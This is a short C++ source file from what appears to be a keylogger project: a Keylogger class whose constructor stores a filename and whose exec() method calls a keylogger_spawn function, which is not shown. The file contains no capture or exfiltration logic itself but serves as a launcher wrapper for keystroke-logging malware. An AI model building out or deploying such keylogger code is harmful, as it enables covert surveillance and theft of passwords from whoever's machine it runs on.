#include "keylogger_object.h"


Keylogger::Keylogger(string filename)
{
	this->Keylogger::f_name = filename;
}

void Keylogger::exec()
{
	keylogger_spawn(Keylogger::f_name);
}